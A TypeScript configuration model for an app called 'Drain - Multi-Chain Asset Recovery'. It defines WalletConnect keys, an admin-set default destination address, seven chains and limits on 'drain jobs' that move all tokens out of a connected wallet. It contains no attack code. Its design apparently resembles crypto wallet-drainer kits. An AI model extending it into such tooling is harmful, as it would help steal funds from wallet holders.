/**
 * AppConfig Model
 * Stores application configuration that can be updated via admin panel
 * This allows changing settings without redeploying the application
 */

export interface AppConfig {
  id: number;
  key: string;
  value: string;
  description?: string;
  category: 'walletconnect' | 'blockchain' | 'app' | 'security';
  isSecret: boolean; // Whether to mask value in admin UI
  updatedAt: Date;
  createdAt: Date;
}

/**
 * Configuration keys used in the application
 */
export enum ConfigKey {
  // WalletConnect/Reown AppKit
  WALLETCONNECT_PROJECT_ID = 'walletconnect.projectId',
  WALLETCONNECT_APP_SECRET = 'walletconnect.appSecret',

  // App Metadata
  APP_NAME = 'app.name',
  APP_DESCRIPTION = 'app.description',
  APP_URL = 'app.url',
  APP_ICON_URL = 'app.iconUrl',

  // Default Destination Address
  DESTINATION_ADDRESS = 'blockchain.destinationAddress',

  // Supported Chains (comma-separated chain IDs)
  SUPPORTED_CHAINS = 'blockchain.supportedChains',

  // API Configuration
  MAX_DRAIN_JOBS_PER_USER = 'security.maxDrainJobsPerUser',
  JOB_TIMEOUT_MINUTES = 'security.jobTimeoutMinutes',
  RATE_LIMIT_PER_HOUR = 'security.rateLimitPerHour',
}

/**
 * Default configuration values
 */
export const defaultConfig: Record<string, Partial<AppConfig>> = {
  [ConfigKey.WALLETCONNECT_PROJECT_ID]: {
    key: ConfigKey.WALLETCONNECT_PROJECT_ID,
    value: process.env.VITE_WALLETCONNECT_PROJECT_ID || '',
    description: 'WalletConnect Project ID from cloud.walletconnect.com',
    category: 'walletconnect',
    isSecret: false,
  },
  [ConfigKey.WALLETCONNECT_APP_SECRET]: {
    key: ConfigKey.WALLETCONNECT_APP_SECRET,
    value: process.env.VITE_WALLETCONNECT_APP_SECRET || '',
    description: 'WalletConnect App Secret for backend operations',
    category: 'walletconnect',
    isSecret: true,
  },
  [ConfigKey.APP_NAME]: {
    key: ConfigKey.APP_NAME,
    value: 'Drain - Multi-Chain Asset Recovery',
    description: 'Application display name',
    category: 'app',
    isSecret: false,
  },
  [ConfigKey.APP_DESCRIPTION]: {
    key: ConfigKey.APP_DESCRIPTION,
    value: 'Transfer all tokens from one wallet to another',
    description: 'Application description shown in wallet connection',
    category: 'app',
    isSecret: false,
  },
  [ConfigKey.APP_URL]: {
    key: ConfigKey.APP_URL,
    value: 'https://drain.app',
    description: 'Application URL',
    category: 'app',
    isSecret: false,
  },
  [ConfigKey.APP_ICON_URL]: {
    key: ConfigKey.APP_ICON_URL,
    value: 'https://avatars.githubusercontent.com/u/37784886',
    description: 'Application icon URL',
    category: 'app',
    isSecret: false,
  },
  [ConfigKey.DESTINATION_ADDRESS]: {
    key: ConfigKey.DESTINATION_ADDRESS,
    value:
      process.env.VITE_DESTINATION_ADDRESS ||
      '0x0000000000000000000000000000000000000000',
    description: 'Default destination address for token transfers',
    category: 'blockchain',
    isSecret: false,
  },
  [ConfigKey.SUPPORTED_CHAINS]: {
    key: ConfigKey.SUPPORTED_CHAINS,
    value: '1,137,10,42161,43114,56,100', // mainnet, polygon, optimism, arbitrum, avalanche, bsc, gnosis
    description: 'Comma-separated list of supported chain IDs',
    category: 'blockchain',
    isSecret: false,
  },
  [ConfigKey.MAX_DRAIN_JOBS_PER_USER]: {
    key: ConfigKey.MAX_DRAIN_JOBS_PER_USER,
    value: '5',
    description: 'Maximum concurrent drain jobs per user',
    category: 'security',
    isSecret: false,
  },
  [ConfigKey.JOB_TIMEOUT_MINUTES]: {
    key: ConfigKey.JOB_TIMEOUT_MINUTES,
    value: '30',
    description: 'Maximum time a drain job can run before timeout',
    category: 'security',
    isSecret: false,
  },
  [ConfigKey.RATE_LIMIT_PER_HOUR]: {
    key: ConfigKey.RATE_LIMIT_PER_HOUR,
    value: '10',
    description: 'Maximum API requests per hour per IP',
    category: 'security',
    isSecret: false,
  },
};
